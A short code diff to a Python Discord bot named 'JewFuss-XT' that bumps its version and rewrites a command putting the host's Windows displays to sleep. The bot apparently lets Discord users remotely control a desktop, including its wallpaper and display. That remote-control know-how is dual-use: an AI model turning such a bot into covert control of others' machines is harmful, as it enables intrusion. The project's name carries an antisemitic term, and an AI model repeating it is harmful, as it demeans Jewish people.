@@ -48,7 +48,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.8.1" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.8.2" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 USE_TRAY_ICON = False # Enables Tray icon allowing you to exit the bot on the desktop easily, used for testing or if used as a remote desktop tool | Default: False
 
 intents = discord.Intents.all()
@@ -224,11 +224,15 @@ def check_permissions(file_path):
 
 @bot.command(aliases=['sleepdisplay'], help="Put displays into sleep mode", usage="$displaysleep")
 async def displaysleep(ctx):
-    try:
-        await asyncio.to_thread(ctypes.windll.user32.SendMessageW, 0xFFFF, 0x0112, 0xF170, 2)
-        await ctx.send("Putting displays to sleep")
-    except Exception as e:
-        await ctx.send(f"Error: {e}")
+    await ctx.send("Putting displays to sleep")
+
+    async def eepy():
+        try:
+            await asyncio.to_thread(ctypes.windll.user32.PostMessageW,0xFFFF,0x0112,0xF170,2)
+        except Exception as e:
+            await ctx.send(f"Error: {e}")
+
+    asyncio.create_task(eepy())
 
 @bot.command(help="Gets or sets the desktop wallpaper. Usage: $wallpaper get | $wallpaper set [optional: image path or upload image]", usage="$wallpaper <set|get> [location]")
 async def wallpaper(ctx, action: str = None, filepath: str = None):
